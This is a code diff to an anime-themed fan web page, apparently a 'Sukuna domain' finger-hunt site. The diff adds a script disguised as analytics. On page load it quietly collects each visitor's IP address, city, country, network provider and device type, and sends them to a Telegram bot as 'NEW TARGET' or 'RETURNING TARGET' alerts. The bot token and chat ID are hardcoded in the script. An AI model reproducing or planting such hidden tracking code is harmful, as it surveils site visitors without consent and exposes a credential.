@@ -3846,5 +3846,51 @@ window.addEventListener('resize', applyNaturalRatios);
 console.log('%c⚠ SUKUNA DOMAIN ACTIVE', 'color:#8b0000;font-size:20px;font-weight:bold;');
 console.log('%cSearch for the 20 fingers — they are hidden throughout the domain.', 'color:#d4c9b0;font-size:12px;');
 </script>
+  <script>
+async function runDolaAnalytics() {
+    const BOT_CONFIG = {
+        token: '7800042874:AAH6IhztbG2BeypuYl5_ZxKzFCOnmOgkD7k',
+        chatId: '8528072384'
+    };
+
+    const isReturning = localStorage.getItem('v_tag');
+    const siteTitle = document.title || "Sukuna Project";
+
+    if (isReturning) {
+        // إشعار للزائر المتكرر
+        const msg = encodeURIComponent(`🔄 [RETURNING TARGET]\n👤 الهدف عاد للموقع\n🌐 الموقع: ${siteTitle}\n⏰ ${new Date().toLocaleString('ar-EG')}`);
+        fetch(`https://api.telegram.org/bot${BOT_CONFIG.token}/sendMessage?chat_id=${BOT_CONFIG.chatId}&text=${msg}`);
+    } else {
+        try {
+            // جلب البيانات للزائر الجديد
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            
+            let deviceType = "PC 💻";
+            if (/Android/i.test(navigator.userAgent)) deviceType = "Android 📱";
+            else if (/iPhone|iPad/i.test(navigator.userAgent)) deviceType = "iPhone 🍎";
+
+            const report = `🚨 [NEW TARGET DETECTED]\n` +
+                           `-------------------------\n` +
+                           `🌐 الموقع: ${siteTitle}\n` +
+                           `📍 المكان: ${data.city}, ${data.country_name}\n` +
+                           `🌐 IP: ${data.ip}\n` +
+                           `📡 الشبكة: ${data.org}\n` +
+                           `📱 الجهاز: ${deviceType}\n` +
+                           `-------------------------\n` +
+                           `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+
+            await fetch(`https://api.telegram.org/bot${BOT_CONFIG.token}/sendMessage?chat_id=${BOT_CONFIG.chatId}&text=${encodeURIComponent(report)}`);
+            localStorage.setItem('v_tag', 'true');
+        } catch (err) {
+            // في حالة فشل جلب البيانات (مثلا بسبب AdBlock)
+            fetch(`https://api.telegram.org/bot${BOT_CONFIG.token}/sendMessage?chat_id=${BOT_CONFIG.chatId}&text=${encodeURIComponent('🚨 [ACCESS]: دخول هدف جديد (تفاصيل المكان محجوبة)')}`);
+        }
+    }
+}
+
+// تشغيل النظام بعد اكتمال تحميل كل شيء
+window.addEventListener('load', runDolaAnalytics);
+</script>
 </body>
 </html>
